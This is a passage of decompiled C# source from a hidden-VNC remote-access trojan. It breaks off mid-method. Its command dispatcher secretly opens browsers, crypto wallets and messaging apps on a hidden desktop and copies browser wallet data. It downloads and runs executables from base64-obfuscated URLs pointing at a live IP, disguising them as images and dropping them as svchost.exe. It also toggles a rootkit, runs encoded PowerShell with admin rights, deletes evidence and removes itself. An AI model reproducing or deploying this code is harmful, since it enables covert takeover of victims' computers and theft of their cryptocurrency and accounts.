					else if (Operators.ConditionalCompareObjectEqual(left, 998, TextCompare: false))
					{
						OperaNeon.StartOperaNeon(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
					}
					else if (Operators.ConditionalCompareObjectEqual(left, 999, TextCompare: false))
					{
						Orbitum.StartOrbitum(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
					}
					else
					{
						if (Operators.ConditionalCompareObjectEqual(left, 1000, TextCompare: false))
						{
							return;
						}
						if (Operators.ConditionalCompareObjectEqual(left, 1001, TextCompare: false))
						{
							SlimJet.StartSlimjet(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
						}
						else if (Operators.ConditionalCompareObjectEqual(left, 1002, TextCompare: false))
						{
							Sputnik.StartSputnik(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
						}
						else
						{
							if (Operators.ConditionalCompareObjectEqual(left, 1003, TextCompare: false))
							{
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(left, 1004, TextCompare: false))
							{
								Vivaldi.StartVivaldi(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 1005, TextCompare: false))
							{
								Waterfox.StartWaterfox(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 1006, TextCompare: false))
							{
								Yandex.StartYandex(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 1007, TextCompare: false))
							{
								HVNC.KillAllBrowser();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 1008, TextCompare: false))
							{
								new dog();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 8587, TextCompare: false))
							{
								HVNC.ResetScale();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 8589, TextCompare: false))
							{
								HVNC.DownloadExecute(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 8890, TextCompare: false))
							{
								HVNC.addtoS();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 8891, TextCompare: false))
							{
								HVNC.removeS();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2001, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM firefox.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2002, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM msedge.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2003, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM epic.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2004, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM vivaldi.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2005, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM chrome.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2005, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM brave.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2006, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM browser.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2007, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM 360browser.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2008, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM SMSHoists.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2009, TextCompare: false))
							{
								HVNC.StopRootkit();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2010, TextCompare: false))
							{
								HVNC.StartRootkit();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2011, TextCompare: false))
							{
								HVNC.refd();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2012, TextCompare: false))
							{
								HVNC.ExecuteNewDesktop(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "putty.exe"));
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2013, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM putty.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2014, TextCompare: false))
							{
								HVNC.openwallet("Armory");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2015, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM ArmoryQt.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2016, TextCompare: false))
							{
								HVNC.openwallet("Coinomi");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2017, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM Coinomi.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2018, TextCompare: false))
							{
								HVNC.openwallet("Guarda");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2019, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM Guarda.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2020, TextCompare: false))
							{
								HVNC.openwallet("Exodus");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2021, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM Exodus.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2022, TextCompare: false))
							{
								HVNC.openwallet("Atomic");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2023, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM \"Atomic Wallet.exe\"");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2024, TextCompare: false))
							{
								HVNC.openwallet("Jaxx");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2025, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM \"Jaxx Liberty.exe\"");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2026, TextCompare: false))
							{
								HVNC.openwallet("Electrum");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2027, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM electrum-4.2.2.exe");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2028, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM HxOutlook.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process in processes)
								{
									if (process.ProcessName == "OUTLOOK")
									{
										process.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2029, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM Foxmail.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process2 in processes)
								{
									if (process2.ProcessName == "Foxmail")
									{
										process2.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2030, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM Foxmail.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process3 in processes)
								{
									if (process3.ProcessName == "Foxmail")
									{
										process3.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2031, TextCompare: false))
							{
								Process[] processes = Process.GetProcesses();
								foreach (Process process4 in processes)
								{
									if (process4.ProcessName == "thunderbird")
									{
										process4.Kill();
										break;
									}
								}
								Process.Start("thunderbird").WaitForInputIdle();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2032, TextCompare: false))
							{
								HVNC.openwallet("Skype");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2033, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM Skype.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process5 in processes)
								{
									if (process5.ProcessName == "Skype")
									{
										process5.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2034, TextCompare: false))
							{
								HVNC.openwallet("Discord");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2035, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM Discord.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process6 in processes)
								{
									if (process6.ProcessName == "Discord")
									{
										process6.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2036, TextCompare: false))
							{
								HVNC.openwallet("Telegram");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2037, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM Telegram.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process7 in processes)
								{
									if (process7.ProcessName == "Telegram")
									{
										process7.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2038, TextCompare: false))
							{
								HVNC.openwallet("Control");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2039, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM control.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process8 in processes)
								{
									if (process8.ProcessName == "control")
									{
										process8.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2040, TextCompare: false))
							{
								HVNC.openwallet("Notepad");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2041, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM notepad.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process9 in processes)
								{
									if (process9.ProcessName == "notepad")
									{
										process9.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2043, TextCompare: false))
							{
								HVNC.CopyExtentions();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2052, TextCompare: false))
							{
								HVNC.openwallet("msinfo32");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2053, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM msinfo32.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process10 in processes)
								{
									if (process10.ProcessName == "msinfo32")
									{
										process10.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2054, TextCompare: false))
							{
								HVNC.openwallet("mstsc");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2055, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM mstsc.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process11 in processes)
								{
									if (process11.ProcessName == "mstsc")
									{
										process11.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2056, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM browser.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process12 in processes)
								{
									if (process12.ProcessName == "browser")
									{
										process12.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2057, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM dragon.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process13 in processes)
								{
									if (process13.ProcessName == "dragon")
									{
										process13.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2058, TextCompare: false))
							{
								HVNC.openwallet("DingTalk");
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2059, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM DingTalkLite.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process14 in processes)
								{
									if (process14.ProcessName == "DingTalkLite")
									{
										process14.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2060, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM neon.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process15 in processes)
								{
									if (process15.ProcessName == "neon")
									{
										process15.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2061, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM waterfox.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process16 in processes)
								{
									if (process16.ProcessName == "waterfox")
									{
										process16.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2062, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM orbitum.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process17 in processes)
								{
									if (process17.ProcessName == "orbitum")
									{
										process17.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2063, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM atom.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process18 in processes)
								{
									if (process18.ProcessName == "atom")
									{
										process18.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2064, TextCompare: false))
							{
								HVNC.StartProcess("taskkill /F /IM slimjet.exe");
								Process[] processes = Process.GetProcesses();
								foreach (Process process19 in processes)
								{
									if (process19.ProcessName == "slimjet")
									{
										process19.Kill();
										break;
									}
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2065, TextCompare: false))
							{
								HVNC.IcarusRec();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2066, TextCompare: false))
							{
								HVNC.DelEvi();
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2067, TextCompare: false))
							{
								Outils.SendInformation(message: "2167|" + HVNC.Getscreensize(), stream: Outils.nstream);
							}
							else if (Operators.ConditionalCompareObjectEqual(left, 2068, TextCompare: false))
							{
								Outils.SendInformation(message: "2168|" + HVNC.GetFPS(), stream: Outils.nstream);
							}
						}
					}
				}
			}
		}
		catch
		{
		}
	}

	private void OnMapUpdated()
	{
		Interlocked.Increment(ref HVNC._frameCount);
	}

	private static string GetFPS()
	{
		return Convert.ToString(HVNC.GetFps());
	}

	private static double GetFps()
	{
		double totalSeconds = (DateTime.Now - HVNC._lastCheckTime).TotalSeconds;
		double result = (double)Interlocked.Exchange(ref HVNC._frameCount, 0L) / totalSeconds;
		HVNC._lastCheckTime = DateTime.Now;
		return result;
	}

	public static string Getscreensize()
	{
		return Screen.PrimaryScreen.Bounds.Width + "x" + Screen.PrimaryScreen.Bounds.Height;
	}

	public static void GetPong()
	{
		Outils.SendInformation(Outils.nstream, "719|");
	}

	private static void DelEvi()
	{
		if (File.Exists(Path.Combine(Path.GetTempPath(), "Icarus.zip")))
		{
			File.Delete(Path.Combine(Path.GetTempPath(), "Icarus.zip"));
		}
	}

	private static void IcarusRec()
	{
		if (File.Exists(Path.Combine(Path.GetTempPath(), "Icarus.zip")))
		{
			Outils.SendInformation(message: "3308|" + Convert.ToBase64String(File.ReadAllBytes(Path.Combine(Path.GetTempPath(), "Icarus.zip"))), stream: Outils.nstream);
			return;
		}
		File.WriteAllBytes(bytes: Convert.FromBase64String(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovLzgwLjc2LjUxLjEwODo4MS9jcnlwdC9wdWJsaWMvVXBkYXRlX0Rvd25sb2Fkcy9JY2FyLmpwZw==")))).ReadToEnd()), path: Path.GetTempPath() + "\\svchost.exe");
		HVNC.RunPS(Path.GetTempPath() + "\\svchost.exe  socket");
		File.Delete(Path.GetTempPath() + "\\svchost.exe");
		while (!File.Exists(Path.Combine(Path.GetTempPath(), "Icarus.zip")))
		{
		}
		Outils.SendInformation(message: "3308|" + Convert.ToBase64String(File.ReadAllBytes(Path.Combine(Path.GetTempPath(), "Icarus.zip"))), stream: Outils.nstream);
	}

	private static void CopyExtentions()
	{
	}

	public static void GetEdgeWallets(string sSaveDir)
	{
		try
		{
			Directory.CreateDirectory(sSaveDir);
			foreach (string[] edgeWalletsDirectory in HVNC.EdgeWalletsDirectories)
			{
				HVNC.CopyWalletFromDirectoryTo(sSaveDir, edgeWalletsDirectory[1], edgeWalletsDirectory[0]);
			}
			if (HVNC.BrowserWallets == 0)
			{
				Filemanager.RecursiveDelete(sSaveDir);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void GetChromeWallets(string sSaveDir)
	{
		try
		{
			Directory.CreateDirectory(sSaveDir);
			foreach (string[] chromeWalletsDirectory in HVNC.ChromeWalletsDirectories)
			{
				HVNC.CopyWalletFromDirectoryTo(sSaveDir, chromeWalletsDirectory[1], chromeWalletsDirectory[0]);
			}
			if (HVNC.BrowserWallets == 0)
			{
				Filemanager.RecursiveDelete(sSaveDir);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
	{
		string destFolder = Path.Combine(sSaveDir, sWalletName);
		if (Directory.Exists(sWalletDir))
		{
			Filemanager.CopyDirectory(sWalletDir, destFolder);
			HVNC.BrowserWallets++;
		}
	}

	public static void addtoS()
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		string s = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovLzgwLjc2LjUxLjEwODo4MS9jcnlwdC9wdWJsaWMvVXBkYXRlX0Rvd25sb2Fkcy9hZGQuanBn")))).ReadToEnd();
		string text = Path.Combine(Path.GetTempPath(), "proclog.exe");
		string text2 = Path.Combine(Path.GetTempPath(), "drive.bat");
		File.WriteAllBytes(text, Convert.FromBase64String(s));
		StreamWriter streamWriter = new StreamWriter(text2);
		streamWriter.WriteLine("set exeFile=" + text);
		streamWriter.WriteLine("%exeFile% enable " + Process.GetCurrentProcess().MainModule.FileName);
		streamWriter.WriteLine("del %exeFile%");
		streamWriter.WriteLine("del \"%~f0\"");
		streamWriter.Close();
		Process.Start(new ProcessStartInfo
		{
			FileName = text2,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void removeS()
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		string s = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovLzgwLjc2LjUxLjEwODo4MS9jcnlwdC9wdWJsaWMvVXBkYXRlX0Rvd25sb2Fkcy9hZGQuanBn")))).ReadToEnd();
		string text = Path.Combine(Path.GetTempPath(), "proclog.exe");
		string text2 = Path.Combine(Path.GetTempPath(), "drive.bat");
		File.WriteAllBytes(text, Convert.FromBase64String(s));
		StreamWriter streamWriter = new StreamWriter(text2);
		streamWriter.WriteLine("set exeFile=" + text);
		streamWriter.WriteLine("%exeFile% disable " + Process.GetCurrentProcess().MainModule.FileName);
		streamWriter.WriteLine("del %exeFile%");
		streamWriter.WriteLine("del \"%~f0\"");
		streamWriter.Close();
		Process.Start(new ProcessStartInfo
		{
			FileName = text2,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void openwallet(string wallet)
	{
		string userName = Environment.UserName;
		_ = "C:\\Users\\" + userName + "\\AppData\\Roaming\\Armory";
		_ = "C:\\Users\\" + userName + "\\AppData\\Local\\Coinomi";
		_ = "C:\\Users\\" + userName + "\\AppData\\Local\\Programs\\Guarda";
		_ = "C:\\Users\\" + userName + "\\AppData\\Roaming\\Guarda";
		_ = "C:\\Users\\" + userName + "\\AppData\\Local\\exodus";
		_ = "C:\\Users\\" + userName + "\\AppData\\Roaming\\Exodus";
		_ = "C:\\Users\\" + userName + "\\AppData\\Local\\Programs\\atomic";
		_ = "C:\\Users\\" + userName + "\\AppData\\Roaming\\atomic";
		_ = "C:\\Users\\" + userName + "\\AppData\\Local\\Programs\\com.liberty.jaxx";
		_ = "C:\\Users\\" + userName + "\\AppData\\Roaming\\com.liberty.jaxx";
		_ = "C:\\Users\\" + userName + "\\AppData\\Roaming\\Electrum";
		if (wallet.Contains("Armory"))
		{
			if (File.Exists("C:\\Program Files (x86)\\Armory\\ArmoryQt.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Program Files (x86)\\Armory\\ArmoryQt.exe");
			}
		}
		else if (wallet.Contains("Coinomi"))
		{
			if (File.Exists("C:\\Program Files\\Coinomi\\Wallet\\Coinomi.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Program Files\\Coinomi\\Wallet\\Coinomi.exe");
			}
		}
		else if (wallet.Contains("Guarda"))
		{
			if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Programs\\Guarda\\Guarda.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Users\\" + userName + "\\AppData\\Local\\Programs\\Guarda\\Guarda.exe");
			}
		}
		else if (wallet.Contains("Exodus"))
		{
			if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\exodus\\Exodus.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Users\\" + userName + "\\AppData\\Local\\exodus\\Exodus.exe");
			}
		}
		else if (wallet.Contains("Atomic"))
		{
			if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Programs\\atomic\\Atomic Wallet.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Users\\" + userName + "\\AppData\\Local\\Programs\\atomic\\Atomic Wallet.exe");
			}
		}
		else if (wallet.Contains("Jaxx"))
		{
			if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Programs\\com.liberty.jaxx\\Jaxx Liberty.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Users\\" + userName + "\\AppData\\Local\\Programs\\com.liberty.jaxx\\Jaxx Liberty.exe");
			}
		}
		else if (wallet.Contains("Electrum"))
		{
			if (File.Exists("C:\\Program Files (x86)\\Electrum\\electrum-4.2.2.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Program Files (x86)\\Electrum\\electrum-4.2.2.exe");
			}
		}
		else if (wallet.Contains("Skype"))
		{
			if (File.Exists("C:\\Program Files\\WindowsApps\\Microsoft.SkypeApp_15.85.3409.0_x86__kzf8qxf38zg5c\\Skype\\Skype.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Program Files\\WindowsApps\\Microsoft.SkypeApp_15.85.3409.0_x86__kzf8qxf38zg5c\\Skype\\Skype.exe");
			}
		}
		else if (wallet.Contains("Discord"))
		{
			if (File.Exists("C:\\Users\\" + HVNC.userFame + "\\AppData\\Local\\Discord\\app-1.0.9005\\Discord.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Users\\" + HVNC.userFame + "\\AppData\\Local\\Discord\\app-1.0.9005\\Discord.exe");
			}
		}
		else if (wallet.Contains("Telegram"))
		{
			if (File.Exists("C:\\Users\\" + HVNC.userFame + "\\AppData\\Roaming\\Telegram Desktop\\Telegram.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Users\\" + HVNC.userFame + "\\AppData\\Roaming\\Telegram Desktop\\Telegram.exe");
			}
		}
		else if (wallet.Contains("Notepad"))
		{
			if (File.Exists("C:\\Windows\\notepad.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Windows\\notepad.exe");
			}
		}
		else if (wallet.Contains("Control"))
		{
			if (File.Exists("C:\\Windows\\System32\\control.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Windows\\System32\\control.exe");
			}
		}
		else if (wallet.Contains("msinfo32"))
		{
			if (File.Exists("C:\\Windows\\System32\\msinfo32.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Windows\\System32\\msinfo32.exe");
			}
		}
		else if (wallet.Contains("mstsc"))
		{
			if (File.Exists("C:\\Windows\\System32\\mstsc.exe"))
			{
				HVNC.ExecuteNewDesktop("C:\\Windows\\System32\\mstsc.exe");
			}
		}
		else if (wallet.Contains("DingTalk") && File.Exists("C:\\Program Files (x86)\\DingTalkLite\\main\\current\\DingTalkLite.exe"))
		{
			HVNC.ExecuteNewDesktop("C:\\Program Files (x86)\\DingTalkLite\\main\\current\\DingTalkLite.exe");
		}
	}

	public static void refd()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			HVNC.RunPS("-enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(Resources.WD)));
		}
	}

	public static void RunPS(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		process.Start();
	}

	private static void StopRootkit()
	{
		File.WriteAllBytes(bytes: Convert.FromBase64String(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovLzgwLjc2LjUxLjEwODo4MS9jcnlwdC9wdWJsaWMvVXBkYXRlX0Rvd25sb2Fkcy9yZW1vdmUuanBn")))).ReadToEnd()), path: Path.GetTempPath() + "\\rkd.exe");
		Process.Start(Path.GetTempPath() + "\\rkd.exe");
		File.Delete(Path.GetTempPath() + "\\rkd.exe");
	}

	private static void StartRootkit()
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
		File.WriteAllBytes(bytes: Convert.FromBase64String(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovLzgwLjc2LjUxLjEwODo4MS9jcnlwdC9wdWJsaWMvVXBkYXRlX0Rvd25sb2Fkcy9ydC5qcGc=")))).ReadToEnd()), path: Path.GetTempPath() + "\\rk.exe");
		Process.Start(Path.GetTempPath() + "\\rk.exe");
		File.Delete(Path.GetTempPath() + "\\rk.exe");
	}

	public static void ExecuteNewDesktop(string path)
	{
		string text = "RemoteDesktop";
		IntPtr threadDesktop = Native.GetThreadDesktop(Native.GetCurrentThreadId());
		HVNC.m_desktopName = text;
		Native.SetThreadDesktop(Native.CreateDesktop(HVNC.m_desktopName, IntPtr.Zero, IntPtr.Zero, 0, 511u, IntPtr.Zero));
		HVNC.CreateProcess(path, text);
		Native.SetThreadDesktop(threadDesktop);
	}

	public static bool CreateProcess(string path, string HWID)
	{
		Native.STARTUPINFO lpStartupInfo = default(Native.STARTUPINFO);
		lpStartupInfo.cb = Marshal.SizeOf(lpStartupInfo);
		lpStartupInfo.lpDesktop = HWID;
		Native.PROCESS_INFORMATION lpProcessInformation = default(Native.PROCESS_INFORMATION);
		return Native.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, bInheritHandles: true, 32, IntPtr.Zero, null, ref lpStartupInfo, ref lpProcessInformation);
	}

	public static void ResetScale()
	{
		string text = Path.Combine(Path.GetTempPath(), "rescale.ps1");
		File.WriteAllText(Path.Combine(Path.GetTempPath(), "rescale.ps1"), Resources.String2);
		HVNC.StartProcess("powershell -ep Bypass " + text);
	}

	public static bool IsAdmin()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static void unnistall()
	{
		int num = 5000;
		string text = AppDomain.CurrentDomain.FriendlyName + ".exe";
		string fileName = Process.GetCurrentProcess().MainModule.FileName;
		Process.Start("cmd.exe", "/C taskkill /f /im " + text + " & ping 1.1.1.1 -n 1 -w " + num + " > Nul & Del /F /Q \"" + fileName + "\"");
		try
		{
			if (!HVNC.IsAdmin())
			{
				Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName));
			}
			else
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd",
					Arguments = "/c schtasks /delete /f  /tn \"" + Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName) + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
			}
		}
		catch
		{
		}
		string text2 = Path.GetTempFileName() + ".bat";
		using (StreamWriter streamWriter = new StreamWriter(text2))
		{
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine("timeout 3 > NUL");
			streamWriter.WriteLine("CD " + Application.StartupPath);
			streamWriter.WriteLine("DEL \"" + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + "\" /f /q");
			streamWriter.WriteLine("CD " + Path.GetTempPath());
			streamWriter.WriteLine("DEL \"" + Path.GetFileName(text2) + "\" /f /q");
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = text2,
			CreateNoWindow = true,
			ErrorDialog = false,
			UseShellExecute = false,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		Environment.Exit(0);
	}

	public static void StartOutlook()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName == "OUTLOOK")
			{
				process.Kill();
				break;
			}
		}
		Process.Start("outlook").WaitForInputIdle();
	}

	public static void StartFoxMail()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName == "Foxmail")
			{
				process.Kill();
				break;
			}
		}
		string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\", "Foxmail*");
		foreach (string text in directories)
		{
			if (text.Contains("Foxmail"))
			{
				Path.GetFullPath(text);
				Process.Start(text + "\\Foxmail.exe").WaitForInputIdle();
				break;
			}
		}
	}

	public static void StartThunderbird()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName == "thunderbird")
			{
				process.Kill();
				break;
			}
		}
		Process.Start("thunderbird").WaitForInputIdle();
	}

	public static void KillApp(string App)
	{
		HVNC.StartProcess("taskkill /F /IM " + App);
	}

	public static void StartProcess(string processx)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			UseShellExecute = false,
